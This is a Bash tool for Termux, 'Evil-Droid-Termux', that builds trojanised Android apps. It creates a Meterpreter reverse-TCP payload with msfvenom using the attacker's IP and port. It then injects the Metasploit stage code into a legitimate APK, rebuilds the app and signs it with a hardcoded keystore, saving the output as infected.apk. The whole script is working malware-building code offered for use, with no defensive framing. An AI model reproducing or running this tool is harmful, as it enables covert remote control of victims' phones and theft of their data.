#!/bin/bash

# Evil-Droid-Termux - Fully Auto Error Fix Version
# Made By Md Abdullah

# Colors
red='\033[1;31m'
green='\033[1;32m'
yellow='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
reset='\033[0m'

# Check Internet
internet_check() {
ping -q -c 1 google.com > /dev/null
if [ $? -ne 0 ]; then
    echo -e "${red}[!] No internet. Check your connection.${reset}"
    exit 1
fi
}

# Banner
banner() {
clear
echo -e "${cyan}"
cat << "EOF"
███████╗██╗██╗     ██████╗     ██████╗ ██████╗ ██╗██████╗ 
██╔════╝██║██║     ██╔══██╗    ██╔══██╗██╔══██╗██║██╔══██╗
█████╗  ██║██║     ██████╔╝    ██████╔╝██████╔╝██║██████╔╝
██╔══╝  ██║██║     ██╔═══╝     ██╔═══╝ ██╔═══╝ ██║██╔═══╝ 
██║     ██║███████╗██║         ██║     ██║     ██║██║     
╚═╝     ╚═╝╚══════╝╚═╝         ╚═╝     ╚═╝     ╚═╝╚═╝     
EOF
echo -e "${reset}"
echo -e "${yellow}     Made By Md Abdullah | Termux Payload Binder${reset}\n"
}

# Requirements Install with Auto Check
requirements() {
echo -e "${blue}[*] Checking Requirements...${reset}"
packages=(metasploit apktool apksigner openjdk-17 git)

for pkg in "${packages[@]}"; do
    if ! command -v $pkg >/dev/null 2>&1; then
        echo -e "${yellow}[+] Installing $pkg...${reset}"
        pkg install $pkg -y
    else
        echo -e "${green}[+] $pkg already installed.${reset}"
    fi
done
}

# Payload Generator
generate_payload() {
echo
read -p "LHOST (Your IP): " lhost
read -p "LPORT (Port): " lport
output="payload.apk"

if [[ -z "$lhost" || -z "$lport" ]]; then
    echo -e "${red}[!] Invalid input.${reset}"
    return
fi

[[ -f "$output" ]] && rm "$output"

echo -e "${yellow}[*] Generating payload...${reset}"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output

if [[ -f "$output" ]]; then
    echo -e "${green}[+] Payload saved as $output${reset}"
else
    echo -e "${red}[!] Payload generation failed.${reset}"
fi
}

# APK Binding
bind_apk() {
echo
read -p "Original APK Path (/sdcard/app.apk): " original_apk
if [[ ! -f "$original_apk" ]]; then
    echo -e "${red}[!] Original APK not found.${reset}"
    return
fi

read -p "Payload APK Path (Leave blank for auto generate): " payload_apk

if [[ -z "$payload_apk" || ! -f "$payload_apk" ]]; then
    echo -e "${yellow}[!] Payload not found. Generating automatically...${reset}"
    read -p "Enter LHOST (Your IP): " lhost
    read -p "Enter LPORT (Port): " lport
    payload_apk="payload_auto.apk"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $payload_apk
    if [[ -f "$payload_apk" ]]; then
        echo -e "${green}[+] Auto Payload generated as $payload_apk${reset}"
    else
        echo -e "${red}[!] Payload generation failed.${reset}"
        return
    fi
fi

# Clean old
rm -rf original payload infected-unsigned.apk

apktool d "$original_apk" -o original
apktool d "$payload_apk" -o payload

# Find smali path
smali_path=$(find payload/smali -type d -name stage | head -n 1)
if [[ -z "$smali_path" ]]; then
    echo -e "${red}[!] Smali path not found.${reset}"
    return
fi

mkdir -p original/smali/com/metasploit
cp -r "$smali_path" original/smali/com/metasploit/

apktool b original -o infected-unsigned.apk

# Keystore
if [[ ! -f my-release-key.keystore ]]; then
    echo -e "${yellow}[+] Generating Keystore...${reset}"
    keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Md Abdullah, OU=IT, O=Org, L=City, S=State, C=BD"
fi

# Sign APK
echo -e "${yellow}[*] Signing APK...${reset}"
apksigner sign --ks my-release-key.keystore --ks-pass pass:123456 infected-unsigned.apk

mv infected-unsigned.apk $HOME/infected.apk
echo -e "${green}[+] Final APK saved as infected.apk in HOME${reset}"
}

# Clean Old Files
clean() {
rm -rf original payload infected-unsigned.apk payload.apk payload_auto.apk
echo -e "${yellow}[*] Cleaned All Files.${reset}"
}

# Main Menu
menu() {
banner
PS3="Select an option: "
options=("Generate Payload" "Bind APK" "Clean Files" "Exit")
select opt in "${options[@]}"
do
    case $opt in
        "Generate Payload")
            generate_payload
            ;;
        "Bind APK")
            bind_apk
            ;;
        "Clean Files")
            clean
            ;;
        "Exit")
            echo -e "${cyan}Thank you for using Evil-Droid-Termux by Md Abdullah${reset}"
            exit
            ;;
        *) echo -e "${red}Invalid Option${reset}";;
    esac
done
}

# Run
internet_check
requirements
menu
